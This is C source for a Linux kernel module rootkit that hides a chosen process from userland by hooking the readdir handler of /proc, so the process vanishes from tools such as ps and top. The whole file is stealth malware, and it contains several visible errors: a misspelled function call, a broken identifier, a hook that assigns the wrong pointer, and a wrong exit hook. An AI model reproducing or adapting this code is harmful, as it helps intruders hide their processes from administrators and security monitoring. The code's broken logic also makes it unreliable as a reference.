/* hide a process from any application in userland */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <net/sock.h>

/* this gets changed by ./configure */
#define HIDEPID ___HIDEPID___

typedef int (*readdir_t)(struct file *, void *, filldir_t);
readdir_t orig_proc_readdir=NULL;
filldir_t proc_filldir = NULL;

/* nice algorithm to convert string to int and strip out non-ints */
int adore_atoi(const char *str) {
    int ret = 0, mul = 1;
    const char *ptr;
    for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++)
        ;
    ptr--;
    while (ptr >= str) {
        if (*ptr < '0' || *ptr > '9')
            break;
        ret += (*ptr - '0') * mul;
        mul *= 10;
        ptr--;
    }
    return ret;
}

/* return 0 for target pid, making it invisible */
int my_proc_filldir (void *buf, const char *name, int nlen, loff_t off
, ino_t ino, unsigned x) {
    if(ador_atoi(name)==HIDEPID) {
        return 0;
    } /* or just return the original filedir */
    return proc_filldir(buf, name, nlen, off, ino, x);
}

/* invoke the original readdir */
int my_proc_readdir(struct file *fp, void *buf, filldir_t filldir) {
    int r=0;
    proc filldir = filldir;
    r = orig_proc_readdir(fp,buf,my_proc_filldir);
    return r;
}

/* substitute procs orig_readdir with new_reddir */
int hide_pid(readdir_t *orig_readdir, readdir_t new_readdir) {
    struct file *filep;
    if((filep = filp_open("/proc",O_RDONLY,0))==NULL) {
        return -1;
    }
    filep->f_op->readdir = orig_readdir;
    filp_close(filep, 0);
    return 0;
}

/* restore proc to original readdir for cleanup */
int restore (readdir_t orig_readdir) {
    struct file *filep;
    if ((filep = filp_open("/proc", O_RDONLY, 0)) == NULL) {
        return -1;
    }
    filep->f_op->readdir = orig_readdir;
    filp_close(filep, 0);
    return 0;
}

/* exec on load */
static int __init main(void) {
    hide_pid(&orig_proc_readdir, my_proc_readdir);
    return 0;
}

/* reset pointers before unloading */
static void exit(void) {
    restore(orig_proc_readdir);
}

module_init(main);
module_exit(main);

MODULE_LICENSE("DUAL GPL/BSD");
